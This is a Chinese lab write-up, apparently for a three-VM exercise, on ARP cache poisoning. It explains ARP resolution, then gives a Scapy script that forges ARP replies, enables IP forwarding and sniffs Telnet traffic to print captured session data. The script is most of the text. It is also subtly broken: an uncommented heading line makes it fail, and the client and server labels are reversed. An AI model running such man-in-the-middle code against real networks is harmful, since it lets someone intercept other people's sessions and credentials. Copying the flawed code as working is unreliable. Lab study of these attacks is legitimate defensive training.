## 实验原理

准备三台虚拟机 A，B，M

A与B通信过程：

1. 主机A首先查看自己的ARP缓存表，确定其中是否包含有主机B对应的ARP表项。如果找到了对应的MAC地址，则主机A直接利用ARP表中的MAC地址，对IP数据包进行帧封装，并将数据包发送给主机B。
2. 如果主机A在ARP表中找不到对应的MAC地址，则将缓存该数据报文，然后以广播方式发送一个ARP请求报文。

在A用telnet连接B的过程中，通过广播arp协议获取了正确的B的MAC地址，建立了连接，之后与B通信直接使用ARP缓存表的MAC地址。

from scapy.all import *
import os

# 处理数据包
def packet_callback(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw):

        if packet[TCP].sport == 23:
            # 获取Telnet数据
            payload = packet[Raw].load.decode(errors='ignore')
            print("Client-Request:%s" % payload)

        elif packet[TCP].dport == 23:
            # 获取Telnet数据
            payload = packet[Raw].load.decode(errors='ignore')
            print("Server-Response:%s" % payload)

# IP转发
def set_ip_forwarding(enable=True):
    if enable:
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    else:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

# MITM ATT
def mitm_attack(target_ip, gateway_ip):

    set_ip_forwarding(True)

    ARP欺骗
    arp = ARP(op=1, pdst=target_ip, psrc=gateway_ip)
    send(arp, verbose=False) #发送arp包，将自己的MAC地址替换网关地址

    #截取数据包
    sniff(filter="tcp port 23 and host %s" % target_ip, prn=packet_callback, store=0)
